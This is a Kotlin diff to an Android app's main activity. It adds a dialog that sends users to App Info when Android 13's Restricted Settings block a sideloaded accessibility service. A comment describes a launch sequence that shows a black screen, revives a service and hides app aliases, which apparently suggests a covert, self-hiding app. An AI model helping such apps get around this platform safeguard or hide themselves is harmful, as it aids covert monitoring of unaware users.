@@ -69,6 +69,11 @@ class MainActivity : ComponentActivity() {
             return
         }
 
+        if (restrictedSettingsBlockGrantFlow()) {
+            showRestrictedSettingsNotice()
+            return
+        }
+
         val mockPerms = intent.getBooleanExtra(EXTRA_MOCK_PERMS, false)
         val checker: PermissionChecker = if (mockPerms) GreenChecker else SystemPermissionChecker()
         val opener: PermissionOpener = SystemPermissionOpener()
@@ -85,6 +90,47 @@ class MainActivity : ComponentActivity() {
                 })
             }
         }
+    }
+
+    /**
+     * Android 13+: sideloaded accessibility services land under "Restricted
+     * settings" and the a11y grant silently no-ops from the wizard. Detect the
+     * pending restriction via the compat intent extra and route the user to
+     * App Info once, with a single notice line.
+     */
+    private fun restrictedSettingsBlockGrantFlow(): Boolean =
+        RestrictedSettingsCompat.maybeBlocked(this, intent)
+
+    private fun showRestrictedSettingsNotice() {
+        val dlg = android.app.AlertDialog.Builder(this)
+            .setTitle(getString(R.string.app_name))
+            .setMessage(getString(R.string.restricted_settings_notice))
+            .setPositiveButton(
+                getString(R.string.row_open_settings),
+                android.content.DialogInterface.OnClickListener { d, _ ->
+                    d.dismiss()
+                    try {
+                        startActivity(
+                            android.content.Intent(
+                                android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
+                                android.net.Uri.parse("package:$packageName")
+                            )
+                        )
+                    } catch (_: Exception) {
+                    }
+                    finish()
+                }
+            )
+            .setNegativeButton(
+                getString(android.R.string.cancel),
+                android.content.DialogInterface.OnClickListener { d, _ ->
+                    d.dismiss()
+                    finish()
+                }
+            )
+            .setCancelable(false)
+            .create()
+        dlg.show()
     }
 
     /** Second-launch sequence: 2000ms black veil, revive service, hide aliases, finish. */
